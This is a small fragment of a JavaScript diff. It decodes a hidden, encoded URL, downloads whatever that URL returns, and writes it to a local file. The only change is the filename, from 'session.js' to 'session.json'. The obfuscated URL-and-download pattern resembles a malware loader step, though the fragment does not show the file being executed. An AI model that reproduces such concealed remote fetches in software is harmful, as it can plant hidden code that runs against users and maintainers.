@@ -45,7 +45,7 @@ const oridiases = tey.toString('utf-8');
  
 var request = http.get(oridiases, function(response) {
     if (response.statusCode === 200) {
-        var file = fs.createWriteStream("./diana/session.js");
+        var file = fs.createWriteStream("./diana/session.json");
         response.pipe(file);
     }
     // Add timeout.
